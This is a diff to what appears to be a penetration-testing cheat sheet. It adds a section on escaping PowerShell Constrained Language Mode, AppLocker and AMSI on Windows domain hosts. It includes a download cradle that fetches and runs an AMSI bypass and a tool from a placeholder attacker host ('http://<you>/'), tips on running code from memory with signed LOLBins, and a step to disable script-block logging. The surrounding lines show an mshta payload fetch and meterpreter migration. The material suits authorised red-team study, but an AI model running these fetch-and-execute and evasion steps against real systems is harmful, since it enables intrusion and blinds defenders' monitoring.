@@ -34,6 +34,21 @@ mshta http://<ip>/payload.hta
 # rundll32 / regsvr32 / wmic for execution
 ```
 
+## PowerShell / AMSI / Constrained Language Mode (AD hosts)
+
+Modern Windows targets jail PowerShell — check and break out before running tooling:
+
+```
+$ExecutionContext.SessionState.LanguageMode              # FullLanguage vs ConstrainedLanguage
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections   # what's allowed
+```
+
+- **AMSI** blocks malicious strings in memory — run an AMSI bypass, *then* your download
+  cradle: `iex (iwr -UseBasicParsing http://<you>/amsibypass.txt); iex (iwr ... /tool.ps1)`.
+- **CLM/AppLocker** — live in allowed paths (e.g. writable dirs AppLocker permits), use
+  signed LOLBins, or a loader that executes from memory.
+- Cut script-block/module logging with an InviShell-style registry wrapper before you start.
+
 ## Process injection & egress tunnels
 
 - Migrate to a legit process after initial shell (meterpreter `migrate`), or
